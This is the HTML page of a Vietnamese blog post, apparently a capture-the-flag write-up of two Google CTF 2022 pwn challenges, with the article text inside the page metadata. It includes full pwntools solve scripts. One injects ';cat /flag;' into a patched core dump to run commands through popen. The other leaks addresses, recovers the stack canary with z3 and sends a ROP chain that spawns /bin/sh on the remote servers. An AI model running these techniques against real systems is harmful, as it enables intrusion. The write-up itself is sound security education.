<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Google CTF - Madcore, Fixedaslr | pivik</title>
<meta name="keywords" content="">
<meta name="description" content="Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.
Các binary với solve script mình sẽ để ở đây.
Madcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn &hellip;">
<meta name="author" content="">
<link rel="canonical" href="https://pivik271.github.io/posts/googlectf2022/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css" integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://pivik271.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://pivik271.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://pivik271.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://pivik271.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://pivik271.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Google CTF - Madcore, Fixedaslr" />
<meta property="og:description" content="Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.
Các binary với solve script mình sẽ để ở đây.
Madcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn &hellip;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://pivik271.github.io/posts/googlectf2022/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-07-04T01:33:51+07:00" />
<meta property="article:modified_time" content="2022-07-04T01:33:51+07:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Google CTF - Madcore, Fixedaslr"/>
<meta name="twitter:description" content="Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.
Các binary với solve script mình sẽ để ở đây.
Madcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn &hellip;"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://pivik271.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Google CTF - Madcore, Fixedaslr",
      "item": "https://pivik271.github.io/posts/googlectf2022/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Google CTF - Madcore, Fixedaslr",
  "name": "Google CTF - Madcore, Fixedaslr",
  "description": "Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.\nCác binary với solve script mình sẽ để ở đây.\nMadcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn \u0026hellip;",
  "keywords": [
    
  ],
  "articleBody": "Cũng một thời gian rồi mình chưa viết gì trên blog. Vừa mới thi cuối kì xong là có giải Google CTF luôn nên mình quyết định come back. Sau 48h cày xuyên màn đêm cùng đồng bọn thì mình làm được 2 bài pwn, đỡ phế hơn năm rồi hehe.\nCác binary với solve script mình sẽ để ở đây.\nMadcore: Category: pwn Points: 256 Solves: 30 Description: My coredump helper is crashing while handling a crash : ( Overview Những việc mình thường làm đầu tiên khi chơi pwn …\npi@vik: ~/CTF/google_ctf $ file madcore madcore: ELF 64-bit LSB pie executable, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ee34abf2786eb52f2099eed9200e596f9254343b, for GNU/Linux 3.2.0, not stripped pi@vik: ~/CTF/google_ctf $ checksec madcore [*] '/home/pi/CTF/google_ctf/madcore' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled pi@vik: ~/CTF/google_ctf $ Tiếp theo thì mở IDA lên và\nBome rồi, c++. Đọc sơ qua thì có vẻ chương trình nhận vào 1 file core dump rồi xử lí gì đó.\nsize = 0x1000000LL; s = malloc(0x1000000uLL); memset(s, 0, 0x1000000uLL); buf = (char *)s; v23 = 0LL; for ( i = 0; size; printf(\"Read %d\\n\", (unsigned int)i) ) { i = read(0, buf, size); if ( i \u003c= 0 ) break; size -= i; buf += i; } Lúc này mình quyết định không làm nữa và nhảy qua bài Fixedaslr.\nGenerate core dump Sau khi sml với Fixedaslr thì mình cũng đã trở lại rồi đây. Okay lúc này mình quyết định tạo thử 1 file core dump, dựa theo link này.\npi@vik: ~/CTF/google_ctf $ ulimit -c unlimited Mình cũng chuyển location của file core dump về 1 thư mục khác luôn để dễ debug.\npi@vik: ~/CTF/google_ctf $ sudo sysctl -w kernel.core_pattern=/home/pi/CTF/google_ctf/coredump/core_%e_%p Tiếp theo thì mình tạo 1 file c để tạo core dump.\n#include int main() { char buf[0x20]; gets(buf); } pi@vik: ~/CTF/google_ctf $ gcc -o test test.c test.c: In function ‘main’: test.c:5:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration] 5 | gets(buf); | ^~~~ | fgets /usr/bin/ld: /tmp/ccmvs0wy.o: in function `main': test.c:(.text+0x28): warning: the `gets' function is dangerous and should not be used. pi@vik: ~/CTF/google_ctf $ ./test aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa *** stack smashing detected ***: terminated Aborted (core dumped) pi@vik: ~/CTF/google_ctf $ cd coredump/ pi@vik: ~/CTF/google_ctf/coredump $ ls core_test_6040 pi@vik: ~/CTF/google_ctf/coredump $ file core_test_6040 core_test_6040: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './test', real uid: 1000, effective uid: 1000, real gid: 1000, effective gid: 1000, execfn: './test', platform: 'x86_64' Có được file core dump rồi thì mình viết 1 script python để test thử chương trình.\nfrom pwn import * p = process('./madcore') with open('./coredump/core_test_6040', 'rb') as f: core_dump = f.read() payload = core_dump payload = payload.ljust(0x1000000, b'\\x00') p.sendline(payload) p.recvuntil(b'FINISHED READING.\\n') p.interactive() pi@vik: ~/CTF/google_ctf $ python3 test.py [+] Starting local process './madcore': pid 6301 [*] Switching to interactive mode sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found {\"backtrace\":[[0,\"\"],[45524,\"\"],[993956,\"\"],[501318,\"\"],[505870,\"\"],[107638,\"\"],[2035,\"\"]],\"modules\":[\"/home/pi/CTF/google_ctf/test\",\"/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\"]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Process './madcore' stopped with exit code 0 (pid 6301) Finding the bug Sau khi chạy thử đoạn test ở trên, mình có để ý dòng sh: 1: llvm-symbolizer: not found. Điều này có nghĩa là trong chương trình có thực thi lệnh llvm-symbolizer, nhưng trên local mình không có nên mới có dòng đó.\npi@vik: ~/CTF/google_ctf $ which llvm-symbolizer pi@vik: ~/CTF/google_ctf $ Nếu bạn nào chơi ctf nhiều, sau khi thấy dòng system command được thực thi, thì chắc cũng đoán được điều gì rồi.\nYep, mình có nghĩ tới command injection, nhưng lúc này mình vẫn chưa chắc, với cũng không vội, nên mình ngồi reverse sơ qua binary. Sau khi ngồi khoảng 4-5 tiếng đồng hồ vừa reverse vừa tìm bug, thì mình tình cờ tìm đến được hàm này.\nCommand injection v3 = a2[1]; v4 = (const char *)Binary::GetFileName((Binary *)a2[2]); v14 = snprintf(0LL, 0LL, \"%s --obj=%s %p\", *a2, v4, v3); s = (char *)malloc(v14 + 1); v5 = a2[1]; v6 = (const char *)Binary::GetFileName((Binary *)a2[2]); snprintf(s, v14 + 1, \"%s --obj=%s %p\", *a2, v6, v5); stream = popen(s, \"r\"); Huh popen? Lúc này mình mới nhớ về ý tưởng command injection ban đầu. Nếu mình điều khiển được s thì mọi chuyện sẽ xong. Ở dòng snprintf(s, v14 + 1, \"%s --obj=%s %p\", *a2, v6, v5);, mình để ý thấy v6 = (const char *)Binary::GetFileName((Binary *)a2[2]); có vẻ là một ứng viên để điều khiển. Lúc này mình debug thử xem v6 là gì.\nThanh ghi R8 chính là tham số thứ 5 được truyền vào hàm, cũng chính là v6. Hmm v6 lúc này là chuỗi /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2, vậy nếu mình replace chuỗi này trong file core dump thành 1 command thì sao?\nfrom pwn import * p = process('./madcore') to_replace = b'/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2' cmd = b';id;' cmd = cmd.ljust(len(to_replace), b'a') with open('./coredump/core_test_6040', 'rb') as f: core_dump = f.read() core_patched = core_dump.replace(to_replace, cmd) payload = core_patched payload = payload.ljust(0x1000000, b'\\x00') p.sendline(payload) p.recvuntil(b'FINISHED READING.\\n') p.interactive() Okay vậy là mình đã thay đổi chuỗi ở trên thành command id, chạy thử xem thế nào.\npi@vik: ~/CTF/google_ctf $ python3 test.py [+] Starting local process './madcore': pid 6821 [*] Switching to interactive mode sh: 1: llvm-symbolizer: not found sh: 1: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found sh: 1: llvm-symbolizer: not found {\"backtrace\":[[0,\"\"],[45524,\"uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),99\"],[993956,\"\"],[501318,\"\"],[505870,\"\"],[107638,\"\"],[2035,\"\"]],\"modules\":[\"/home/pi/CTF/google_ctf/test\",\";id;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Process './madcore' stopped with exit code 0 (pid 6821) Yay vậy là ý tưởng command injection thực hiện được. Mình mới chạy thử trên server.\npi@vik: ~/CTF/google_ctf $ python3 test.py [+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done [*] Switching to interactive mode {\"backtrace\":[[0,\"\"],[45524,\"\"],[993956,\"\"],[501318,\"\"],[505870,\"\"],[107638,\"\"],[2035,\"\"]],\"modules\":[\"/home/pi/CTF/google_ctf/test\",\"/usr/lib/x86_64-linux-gnu/libc.so.6\",\";id;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to madcore.2022.ctfcompetition.com port 1337 Ủa gì dọ, output của toi đou?\nThật sự thì lúc này mình cũng không biết sao trên server lại không chạy được. Để chắc chắn command injection vẫn hoạt động, mình mới test một vài command khác. Sau 1 lúc test mình thấy command echo /* cho ra output.\npi@vik: ~/CTF/google_ctf $ python3 test.py [+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done [*] Switching to interactive mode {\"backtrace\":[[0,\"\"],[45524,\"/bin /boot /dev /etc /flag /home /lib /lib32 /lib64 /libx32 /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var\\n\"],[993956,\"\"],[501318,\"\"],[505870,\"\"],[107638,\"\"],[2035,\"\"]],\"modules\":[\"/home/pi/CTF/google_ctf/test\",\"/usr/lib/x86_64-linux-gnu/libc.so.6\",\";echo /*;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to madcore.2022.ctfcompetition.com port 1337 Vậy là mình có thể chắc chắn rằng command injection vẫn hoạt động trên server, giờ chỉ việc thay command thành cat /flag thôi.\nFinal script from pwn import * # p = process('./madcore') p = remote('madcore.2022.ctfcompetition.com', 1337) to_replace = b'/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2' cmd = b';cat /flag;' cmd = cmd.ljust(len(to_replace), b'a') with open('./coredump/core_test_6040', 'rb') as f: core_dump = f.read() core_patched = core_dump.replace(to_replace, cmd) payload = core_patched payload = payload.ljust(0x1000000, b'\\x00') p.sendline(payload) p.recvuntil(b'FINISHED READING.\\n') p.interactive() pi@vik: ~/CTF/google_ctf $ python3 solve.py [+] Opening connection to madcore.2022.ctfcompetition.com on port 1337: Done [*] Switching to interactive mode {\"backtrace\":[[0,\"\"],[45524,\"CTF{w4y_cpp_g0tta_be_like_that_can_we_get_a_good_STLPLS}\\n\"],[993956,\"\"],[501318,\"\"],[505870,\"\"],[107638,\"\"],[2035,\"\"]],\"modules\":[\"/home/pi/CTF/google_ctf/test\",\"/usr/lib/x86_64-linux-gnu/libc.so.6\",\";cat /flag;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"]}[*] Got EOF while reading in interactive $ [*] Interrupted [*] Closed connection to madcore.2022.ctfcompetition.com port 1337 Fixedaslr: Category: pwn Points: 240 Solves: 35 Description: I wasn’t happy with the default ASLR, so I fixed it. The flag is in a file called “flag” both in / and cwd. Đầu tiên thì mình xin gửi lời cảm ơn tới 1 người đồng đội đã cùng mình giải bài này, đặc biệt là phần crypto. Kudos to you mate!\nOverview Đề cho 7 object file và 1 file binary loader.\npi@vik: ~/CTF/google_ctf/fixedaslr $ ls basic.o debug.o game.o guard.o loader main.o res.o syscalls.o Vẫn là những điều quen thuộc …\npi@vik: ~/CTF/google_ctf/fixedaslr $ file loader loader: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=71086f1a8e8132c20313b70de229555e4f551144, not stripped pi@vik: ~/CTF/google_ctf/fixedaslr $ checksec loader [*] '/home/pi/CTF/google_ctf/fixedaslr/loader' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) IDA Đầu tiên chương trình gọi hàm sys_getrandom() để tạo 1 giá trị random cho rand_state. Sau đó gọi rand(64) để khởi tạo giá trị cho canary. Tiếp theo load các object file vào memory. Base address của các object file được tạo random bằng cách gọi rand(12) \u003c\u003c 28. Cuối cùng thì gọi hàm pivot_to_main để munmap địa chỉ 0x400000 (địa chỉ base address của file loader) và bắt đầu gọi tới file main.o. Chúng ta sẽ chỉ tập trung vào hàm menu(). Hàm này thì nằm trong game.o.\n__int64 menu() { __int64 result; // rax int v1; // eax char v2[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v3; // [rsp+38h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"\\n-=*) MAIN MENU:\\n 1) Play The Game\\n 2) See full scoreboard\\n 3) See score for place\\n 4) Exit\\nYour choice?\"); if ( (unsigned __int8)readline(v2, 32LL) != 1 ) return 0LL; v1 = (unsigned __int8)atou64(v2); if ( (unsigned __int8)v1 == 4 ) { puts(\"Alright, bye\"); result = 0LL; } else { if ( v1 \u003c= 4 ) { if ( v1 == 3 ) { see_scoreboard(); return 1LL; } if ( v1 \u003c= 3 ) { if ( v1 == 1 ) { game(); return 1LL; } if ( v1 == 2 ) { see_full_scoreboard(); return 1LL; } } } puts(\"Come again?\"); result = 1LL; } return result; } Hàm game() random 2 số rồi cộng lại. Nếu trả lời đúng thì sẽ +5 điểm.\nunsigned __int64 game() { unsigned __int8 v1; // [rsp+Ch] [rbp-64h] unsigned __int8 v2; // [rsp+Dh] [rbp-63h] unsigned __int64 v3; // [rsp+10h] [rbp-60h] __int64 i; // [rsp+18h] [rbp-58h] char s[32]; // [rsp+20h] [rbp-50h] BYREF char v6[40]; // [rsp+40h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+68h] [rbp-8h] v7 = __readfsqword(0x28u); puts(\"Have Fun, Good Luck!\"); v3 = 0LL; for ( i = 1LL; ; ++i ) { print(\"\\nRound \"); u64toa(s, i); puts(s); v1 = rand() % 0xAu; v2 = rand() % 0xAu; print(\"How much is \"); u64toa(s, v1); print(s); print(\" + \"); u64toa(s, v2); print(s); puts(\" ?\"); if ( (unsigned __int8)readline(v6, 32LL) != 1 ) break; if ( v1 + v2 != (unsigned __int8)atou64(v6) ) { puts(\"Wrong! Game Over!\"); check_scoreboard(v3); return v7 - __readfsqword(0x28u); } v3 += 5LL; print(\"Yes! +5pts! You have \"); u64toa(s, v3); print(s); puts(\"pts total.\"); } return v7 - __readfsqword(0x28u); } Nhập sai thì sẽ in ra dòng Wrong! Game Over! và kiểm tra xem số điểm cuối cùng có thể vào được scoreboard không.\nunsigned __int64 __fastcall check_scoreboard(unsigned __int64 score) { int i; // [rsp+14h] [rbp-Ch] unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); for ( i = 0; i \u003c= 9; ++i ) { if ( score \u003e game_scoreboard[i] ) { shift_scoreboard(i); get_player_name(i); game_scoreboard[i] = score; return v3 - __readfsqword(0x28u); } } return v3 - __readfsqword(0x28u); } Nếu được thì sẽ shift scoreboard và gọi hàm get_player_name() để nhập vào tên của player.\nHàm see_scoreboard() cho phép xem số điểm cần thiết để đạt được thứ hạng đó. Còn hàm see_full_scoreboard() thì dùng để xem full scoreboard.\nFinding the bug Giờ thì chúng ta cũng đã hiểu sơ qua cách chương trình hoạt động. Tới lúc tìm bug rồi.\nBug đầu tiên nằm ở hàm get_player_name(). Để ý nếu nbytes \u003e 31 thì mặc dù chương trình in ra dòng Name too long! No SCOREBOARD for you. nhưng vẫn cho phép read vào buffer =\u003e lỗi buffer overflow.\nBug thứ hai thì ở trong hàm see_scoreboard(). Không có đoạn check nào kiểm tra v1 =\u003e out-of-bounds.\nVới lỗi bof thì mình có thể hoàn toàn build 1 cái ropchain, nhưng để làm được điều đó thì mình cần phải bypass được canary. Vậy làm cách nào để bypass được? Hmm, chúng ta vẫn còn lỗi oob chưa sử dụng, vậy trong trường hợp này, mình có thể làm được gì với oob?\nOob Dưới đây là các giá trị trong mảng game_scoreboard.\ngef➤ telescope 0x0000f2b0002000 0x0000f2b0002000│+0x0000: 0x0000000000005f (\"_\"?)\t← $rdx 0x0000f2b0002008│+0x0008: 0x0000000000005a (\"Z\"?) 0x0000f2b0002010│+0x0010: 0x00000000000055 (\"U\"?) 0x0000f2b0002018│+0x0018: 0x00000000000050 (\"P\"?) 0x0000f2b0002020│+0x0020: 0x0000000000004b (\"K\"?) 0x0000f2b0002028│+0x0028: 0x00000000000046 (\"F\"?) 0x0000f2b0002030│+0x0030: 0x00000000000041 (\"A\"?) 0x0000f2b0002038│+0x0038: 0x0000000000003c (\"\u003c\"?) 0x0000f2b0002040│+0x0040: 0x00000000000037 (\"7\"?) 0x0000f2b0002048│+0x0048: 0x00000000000032 (\"2\"?) Ta thấy ở offset 512 chứa 1 địa chỉ.\ngef➤ telescope 0x0000f2b0002000+512*8 0x0000f2b0003000│+0x0000: 0x0000f2b0002060 → 0x00000079726147 (\"Gary\"?) 0x0000f2b0003008│+0x0008: 0x0000000000000000 0x0000f2b0003010│+0x0010: 0x0000000000000000 0x0000f2b0003018│+0x0018: 0x0000000000000000 0x0000f2b0003020│+0x0020: 0x0000000000000000 0x0000f2b0003028│+0x0028: 0x0000000000000000 0x0000f2b0003030│+0x0030: 0x0000000000000000 0x0000f2b0003038│+0x0038: 0x0000000000000000 0x0000f2b0003040│+0x0040: 0x0000000000000000 0x0000f2b0003048│+0x0048: 0x0000000000000000 Địa chỉ này nằm trong vùng main.o nên mình có thể leak được base address của main.o. Tương tự như vậy, ở offset -1023 và -1017 có thể leak thêm base address của 2 file object nữa là game.o và guard.o\ngef➤ telescope 0x0000f2b0002000-1023*8 0x0000f2b0000008│+0x0000: 0x00009580001111 → 0xe5894855fa1e0ff3 0x0000f2b0000010│+0x0008: 0xcccc0000000225ff 0x0000f2b0000018│+0x0010: 0x0000958000175c → 0xe5894855fa1e0ff3 0x0000f2b0000020│+0x0018: 0xcccc0000000225ff 0x0000f2b0000028│+0x0020: 0x00009580001000 → 0xe5894855fa1e0ff3 0x0000f2b0000030│+0x0028: 0xcccc0000000225ff 0x0000f2b0000038│+0x0030: 0x00004080001000 → 0xe5894855fa1e0ff3 0x0000f2b0000040│+0x0038: 0x0000000000000000 0x0000f2b0000048│+0x0040: 0x0000000000000000 0x0000f2b0000050│+0x0048: 0x0000000000000000 3 địa chỉ vừa leak có thể dùng làm offset để leak thêm 1 vài địa chỉ nữa. Mình ví dụ địa chỉ 0x00009580000000 vừa leak được\ngef➤ telescope 0x00009580000000 0x00009580000000│+0x0000: 0xcccc0000000225ff 0x00009580000008│+0x0008: 0x0000db4000119c → 0xe5894855fa1e0ff3 0x00009580000010│+0x0010: 0xcccc0000000225ff 0x00009580000018│+0x0018: 0x0000db400011f2 → 0xe5894855fa1e0ff3 0x00009580000020│+0x0020: 0xcccc0000000225ff 0x00009580000028│+0x0028: 0x00004080001000 → 0xe5894855fa1e0ff3 0x00009580000030│+0x0030: 0xcccc0000000225ff 0x00009580000038│+0x0038: 0x0000db40001ac5 → 0xe5894855fa1e0ff3 0x00009580000040│+0x0040: 0xcccc0000000225ff 0x00009580000048│+0x0048: 0x00004080001000 → 0xe5894855fa1e0ff3 Cứ tiếp tục làm như vậy thì ta có thể leak được 6 base address của các file object (main.o, syscalls.o, guard.o, basic.o, game.o, res.o). Vậy làm sao để có được địa chỉ base address thứ 7 (debug.o)? Well, here comes some crypto magic from my teammate. Đồng đội mình đã giúp mình recover lại canary và tìm luôn địa chỉ của debug.o. Chút nữa mình sẽ để trong script solve cuối cùng.\nRopchain Sau khi có được canary và địa chỉ debug.o thì mọi thứ đã trở nên đơn giản. Mình sẽ build 1 ropchain execve(\"/bin/sh\", 0, 0) để spawn shell. Các gadgets cần thiết thì đã có trong vùng address của debug.o.\ngef➤ x/40i 0x0000e3e0000000+0x1000 0xe3e0001000:\tpush rdi 0xe3e0001001:\tpop rdi 0xe3e0001002:\tret 0xe3e0001003:\tpush rdi 0xe3e0001004:\tpop rsi 0xe3e0001005:\tret 0xe3e0001006:\tpush rdi 0xe3e0001007:\tpop rax 0xe3e0001008:\tret 0xe3e0001009:\tpush rdi 0xe3e000100a:\tpop rbx 0xe3e000100b:\tret 0xe3e000100c:\tpush rdi 0xe3e000100d:\tpop rcx 0xe3e000100e:\tret 0xe3e000100f:\tpush rdi 0xe3e0001010:\tpop rdx 0xe3e0001011:\tret 0xe3e0001012:\tpush rdi 0xe3e0001013:\tpop rsp 0xe3e0001014:\tret 0xe3e0001015:\tpush rdi 0xe3e0001016:\tpop rbp 0xe3e0001017:\tret 0xe3e0001018:\tpush rdi 0xe3e0001019:\tpop r8 0xe3e000101b:\tret 0xe3e000101c:\tpush rdi 0xe3e000101d:\tpop r9 0xe3e000101f:\tret 0xe3e0001020:\tpush rdi 0xe3e0001021:\tpop r10 0xe3e0001023:\tret 0xe3e0001024:\tpush rdi 0xe3e0001025:\tpop r11 0xe3e0001027:\tret 0xe3e0001028:\tpush rdi 0xe3e0001029:\tpop r12 0xe3e000102b:\tret 0xe3e000102c:\tpush rdi Final script from pwn import * # p = process('./loader') p = remote('fixedaslr.2022.ctfcompetition.com', 1337) def get_addr(idx): p.recv() p.sendline(b'3') p.recv() p.sendline(str(idx).encode()) p.recvuntil(b': ') return int(p.recvline()[:-1]) def get_index(start): return ((start - game_score_board_addr) \u0026 0xffffffffffffffff) // 8 main_o = get_addr(512) - 0x60 - 0x2000 game_score_board_addr = main_o + 0x2000 idx = get_index(main_o + 0x8) game_o = get_addr(idx) - 0x1111 idx = get_index(main_o + 0x38) guard_o = get_addr(idx) - 0x1000 idx = get_index(game_o + 0x8) basic_o = get_addr(idx) - 0x119c idx = get_index(guard_o + 0x8) syscalls_o = get_addr(idx) - 0x1064 idx = get_index(game_o + 0x2000) res_o = get_addr(idx) - 0x1000 log.info('main.o : ' + hex(main_o)) log.info('syscalls.o : ' + hex(syscalls_o)) log.info('guard.o : ' + hex(guard_o)) log.info('basic.o : ' + hex(basic_o)) log.info('game.o : ' + hex(game_o)) log.info('res.o : ' + hex(res_o)) known_states = [main_o \u003e\u003e 28, syscalls_o \u003e\u003e 28, guard_o \u003e\u003e 28, basic_o \u003e\u003e 28, game_o \u003e\u003e 28, res_o \u003e\u003e 28] from z3 import * s = Solver() log.info(f'Known states: {known_states}') rand_state = BitVec(\"x\", 64) def rand_extract_bit(a): global rand_state return (rand_state \u003e\u003e a) \u0026 1 def rand_get_bit(): global rand_state x = ( rand_extract_bit(0x3F) ^ rand_extract_bit(0x3D) ^ rand_extract_bit(0x3C) ^ rand_extract_bit(0x3A) ^ 1 ) rand_state = ((rand_state \u003c\u003c 1) % (2**64)) | x return x def rand(n): x = 0 for i in range(n): y = rand_get_bit() x = (x \u003c\u003c 1) | y return x for known_state in known_states: s.add(rand(12) == known_state) recovered_canary = 0 if s.check() == sat: model = s.model() recovered_canary = model[BitVec(\"x\", 64)].as_long() log.info('Recovered canary: ' + hex(recovered_canary)) rand_state = recovered_canary debug_o = 0 for i in range(7): debug_o = rand(12) debug_o = debug_o \u003c\u003c 28 log.info('debug.o : ' + hex(debug_o)) p.recv() p.sendline(b'1') for i in range(12): p.recvuntil(b'How much is ') equation = p.recvline()[:-3] res = eval(equation) p.sendline(str(res).encode()) p.sendline(b'0') p.recv() p.sendline(b'1000') pop_rsi = debug_o + 0x1004 pop_rdx = debug_o + 0x1010 pop_rax = debug_o + 0x1007 syscall = syscalls_o + 0x1002 payload = b'/bin/sh' payload = payload.ljust(0x28, b'\\x00') payload += p64(recovered_canary) payload += b'a'*8 payload += p64(pop_rsi) payload += p64(0) payload += p64(pop_rdx) payload += p64(0) payload += p64(pop_rax) payload += p64(0x3b) payload += p64(syscall) p.recv() p.sendline(payload) p.recvrepeat(0.5) p.interactive() pi@vik: ~/CTF/google_ctf/fixedaslr $ python3 solve.py [+] Opening connection to fixedaslr.2022.ctfcompetition.com on port 1337: Done [*] main.o : 0x1640000000 [*] syscalls.o : 0x2c40000000 [*] guard.o : 0x5d40000000 [*] basic.o : 0x72f0000000 [*] game.o : 0xcc0000000 [*] res.o : 0xeca0000000 [*] Known states: [356, 708, 1492, 1839, 204, 3786] [*] Recovered canary: 0xc12b162013d71ab7 [*] debug.o : 0xf880000000 [*] Switching to interactive mode $ id uid=1000(user) gid=1000(user) groups=1000(user) $ ls -la total 64 drwxr-xr-x 2 nobody nogroup 4096 Jul 2 05:52 . drwxr-xr-x 3 nobody nogroup 4096 Jul 2 05:52 .. -rw-r--r-- 1 nobody nogroup 5040 Jul 1 21:48 basic.o -rw-r--r-- 1 nobody nogroup 1664 Jul 1 21:48 debug.o -rw-r--r-- 1 nobody nogroup 46 Jul 1 21:48 flag -rw-r--r-- 1 nobody nogroup 7280 Jul 1 21:48 game.o -rw-r--r-- 1 nobody nogroup 1416 Jul 1 21:48 guard.o -rwxr-xr-x 1 nobody nogroup 15376 Jul 1 21:48 loader -rw-r--r-- 1 nobody nogroup 2088 Jul 1 21:48 main.o -rw-r--r-- 1 nobody nogroup 1184 Jul 1 21:48 res.o -rw-r--r-- 1 nobody nogroup 3056 Jul 1 21:48 syscalls.o $ cat flag CTF{GuessYouCanSayTheCookieGotRandomlyBroken} $ [*] Interrupted [*] Closed connection to fixedaslr.2022.ctfcompetition.com port 1337 ",
  "wordCount" : "2939",
  "inLanguage": "en",
  "datePublished": "2022-07-04T01:33:51+07:00",
  "dateModified": "2022-07-04T01:33:51+07:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pivik271.github.io/posts/googlectf2022/"
  },
  "publisher": {
